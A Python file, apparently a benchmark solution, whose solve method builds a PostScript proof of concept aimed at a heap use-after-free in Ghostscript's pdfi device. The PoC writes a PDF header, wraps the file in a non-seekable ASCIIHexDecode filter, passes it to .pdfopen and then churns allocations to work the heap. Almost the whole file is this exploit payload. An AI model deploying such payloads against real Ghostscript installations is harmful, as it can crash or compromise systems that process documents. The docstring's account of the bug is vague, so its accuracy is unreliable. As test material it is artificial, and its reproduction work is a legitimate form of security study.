class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (arvo:42280 / Ghostscript Bug 704280) is a Heap Use-After-Free in the pdfi device.
        It occurs when pdfi_set_input_stream fails (e.g., if the stream is not seekable),
        but the cleanup logic mishandles the context or leaves a dangling pointer that is later used.
        
        The PoC creates a PostScript file that:
        1. Writes a valid PDF header to a temporary file.
        2. Opens that file via an ASCIIHexDecode filter (filters are generally non-seekable).
        3. Passes this non-seekable stream to .pdfopen.
        4. .pdfopen reads the header (succeeds) but fails to setup the stream for random access (fails).
        5. This triggers the vulnerable error path. We then trigger some allocations to manipulate the heap.
        """
        
        # Hex for "%PDF-1.4\n"
        pdf_header_hex = b"255044462D312E340A"
        
        poc = b"%!PS\n" \
              b"/fname (poc_stream.dat) def\n" \
              b"/f fname (w) file def\n" \
              b"f (" + pdf_header_hex + b") writestring\n" \
              b"f closefile\n" \
              b"/s fname (r) file /ASCIIHexDecode filter def\n" \
              b"{ s << >> .pdfopen } stopped\n" \
              b"1000 { 100 dict pop } repeat\n" \
              b"quit\n"
              
        return poc